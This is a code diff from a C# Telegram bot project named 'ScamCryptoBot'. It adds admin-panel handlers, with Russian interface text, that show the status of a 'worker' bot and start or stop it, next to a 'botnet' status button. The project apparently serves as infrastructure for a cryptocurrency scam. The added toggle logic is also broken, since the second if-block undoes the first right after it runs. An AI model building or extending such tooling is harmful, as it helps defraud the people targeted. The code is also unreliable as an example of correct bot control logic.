@@ -165,8 +165,34 @@ namespace ScamCryptoBot
                                 await bot.DeleteMessageAsync(callbackQuery.Message.Chat.Id, callbackQuery.Message.MessageId);
                                 text = "⚙️ Вы вошли в панель управления ботами всей экосистемы 🌳\n";
                                 await bot.SendTextMessageAsync(LocalConfig.adminMainId, text, replyMarkup: MainKeyBoard.BotsPanel(), parseMode: ParseMode.Html);
-
                                 break;
+                            // BOT PANEL WORKER BOT
+                            case "mbtn_worker_bot":
+                                await bot.DeleteMessageAsync(LocalConfig.adminMainId, callbackQuery.Message.MessageId);
+                                statusBot = "Остановлен";
+                                if (LocalConfig.isWorkerEnabled)
+                                    statusBot = "Запущен";
+                                text = $"🔐 Статус бота: {statusBot}";
+                                await bot.SendTextMessageAsync(LocalConfig.adminMainId, text, replyMarkup: MainKeyBoard.BotsPanelWorker(), parseMode: ParseMode.Html);
+                                break;
+                                // Worker bot in bots panel
+                            case "mbtn_bots_worker_status":
+                                if (LocalConfig.isWorkerEnabled == false)
+                                {
+                                    await bot.DeleteMessageAsync(callbackQuery.Message.Chat.Id, callbackQuery.Message.MessageId);
+                                    LocalConfig.isWorkerEnabled = true;
+                                    Task.Run(() => worker.Run.RunWorkerBot(cancellationToken));
+                                    await bot.SendTextMessageAsync(LocalConfig.adminMainId, "Бот успешно запущен", replyMarkup: MainKeyBoard.BotsPanelWorker());
+                                }
+                                if (LocalConfig.isWorkerEnabled == true)
+                                {
+                                    await bot.DeleteMessageAsync(callbackQuery.Message.Chat.Id, callbackQuery.Message.MessageId);
+                                    LocalConfig.isWorkerEnabled = false;
+                                    cancellationTokenSource.Cancel(); // Остановить таск путем вызова метода Cancel() у объекта CancellationTokenSource
+                                    await bot.SendTextMessageAsync(LocalConfig.adminMainId, "Бот успешно остановлен", replyMarkup: MainKeyBoard.BotsPanelWorker());
+                                }
+                                break;
+                                
                                 // The Last button on the main menu
                             case "mbtb_status_botnet":
                                 await bot.DeleteMessageAsync(callbackQuery.Message.Chat.Id, callbackQuery.Message.MessageId);
